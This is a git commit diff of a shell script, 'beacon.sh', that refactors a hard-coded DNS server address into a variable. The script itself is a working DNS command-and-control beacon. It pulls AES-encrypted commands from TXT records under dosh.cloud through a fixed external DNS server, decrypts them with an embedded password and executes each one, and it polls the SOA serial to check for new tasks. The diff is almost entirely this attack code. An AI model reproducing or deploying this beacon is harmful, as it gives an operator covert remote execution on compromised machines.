7af6b24ccd2934f110e5474afb2c989ff9c95122
Jared E Stroud <jaredestroud@gmail.com>
2016-03-20 14:13:28 -0400

    Abstracted the DNS server into a variable.

--- beacon.sh
+++ beacon.sh
@@ -4,29 +4,34 @@
 domain="dosh.cloud"
 current=0
 pass="c2FuZHRvbWIK"
+dnsServer="129.21.130.212"
+
 # Pull down commands from server
 pull(){
+
     # Get number of commands to query for
-    num=$(dig @129.21.130.212 -t txt +short num.dosh.cloud)
+    num=$(dig @$dnsServer -t txt +short num.dosh.cloud)
     len=$(echo ${#num})
     num=$(echo ${num:1:len-2})
 
     # Loop through gathering each command and executing
     x=1
     while [ $x -le $num ]; do
-        cmd=$(dig @129.21.130.212 -t txt +short $x.$domain)
+        cmd=$(dig @$dnsServer  -t txt +short $x.$domain)
         len=$(echo ${#cmd})
         # Remove quotations
         cmd=$(echo ${cmd:1:len-2})
+
         # Decode the command
         cmd=$(echo $cmd | openssl enc -aes-256-cbc -d -a -k $pass)
         $cmd
+
         let x=x+1
     done
 }
 
 check(){
-    serial=$(dig @129.21.130.212 -t soa +short $domain | awk '{print $3}')
+    serial=$(dig @$dnsServer -t soa +short $domain | awk '{print $3}')
     echo $serial
 }
 
